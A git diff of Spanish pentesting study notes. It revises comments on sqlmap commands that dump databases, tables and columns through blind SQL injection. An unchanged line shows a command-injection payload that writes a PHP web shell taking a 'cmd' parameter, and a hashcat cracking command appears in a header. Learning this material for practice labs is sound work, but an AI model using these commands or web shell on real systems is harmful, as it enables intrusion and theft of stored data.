@@ -348,12 +348,11 @@ Anthares101@kali:~$ hashcat -m 13400 -a 0 -w 1 fichero diccionario --force --sho
 - **Sql injection:** Existe un tipo de sql injection que es a ciegas. Es decir, los errores de la base de datos o la info no sale por pantalla y es necesario usar logica binaria (true / false) y poner que si un usuario existe, esperar x segundos. `sqlmap` automatiza todo esto:
 ```console
 Anthares101@kali:~$ sqlmap -u URL --headers "Cookie: ..."
-# Con --dbs sqlmap saca todas las bases de datos del sistema
-# -D BBDD --tables Selecciona base de datos BBDD y muestra todas las tablas
-# -D BBDD -T users --dump (Dump de la tabla users)
 # --dump-all Dumpea todas las tablas de todas las bases de datos
+# En vez de -u a mi me gusta utilizar la opción -r para especificar el objetivo
 
 Anthares101@kali:~$ sqlmap --batch --dbs -r post_request.txt
+# Con --dbs sqlmap saca todas las bases de datos del sistema
 # Con la opción -r se puede especificar un ejemplo de POST a la página y que sqlmap haga lo suyo
 # La opción --batch hace que no tengamos que interactuar en el proceso (Selecciona todo por defecto)
 
@@ -361,7 +360,7 @@ Anthares101@kali:~$ sqlmap --current-db --batch -r post_request.txt
 # Saca el nombre de la base de datos actual
 
 Anthares101@kali:~$ sqlmap -D DB --tables --batch -r post_request.txt
-# Extrae la tablas de una determinada base de datos
+# Extrae todas las tablas de una determinada base de datos
 
 Anthares101@kali:~$ sqlmap -D DB -T TABLA --columns -r post_request.txt
 # Extrae información de las columnas de una determinada tabla
@@ -372,7 +371,6 @@ Anthares101@kali:~$ sqlmap -D DB -T TABLA --dump --batch -r post_request.txt
 Anthares101@kali:~$ sqlmap -D DB -T TABLA -C id,password,...,... --sql-query "select id,password,...,... from TABLA where COLUMNA like PATRÓN" -r post_request.txt
 # Permite extraer los resultados de una query especifica a una tabla conocida
 ```
-Otra forma de hacerlo, es copiar de un proxy inverso la peticion HTML del servidor a un fichero y darselo a `sqlmap`.
 - **RCE (Ejecución de comandos remotos):** En principio, si se esta poniendo el codigo directamente: `shell_exec('ping 8.8.8.8');` siendo la ip lo que el usuario mete, si en vez de eso ponemos ;ls pues aunque `ping` de error ejecuta el comando `ls`. Una vez detectada la vulnerabilidad podriamos ejecutar una WebShell: `;echo'<?php echo shell_exec(s_GET["cmd"]); ?>' > shell1.php`. Si nos vamos a `shell1.php`, con el parámetro de la url `cmd` podremos ejecutar los comandos que nos dé la gana.
 - **Metodologia OWASP para testear seguridad en la web:** OWASP broken web application (Para practicar a atacar paginas y esas cosas) 
 
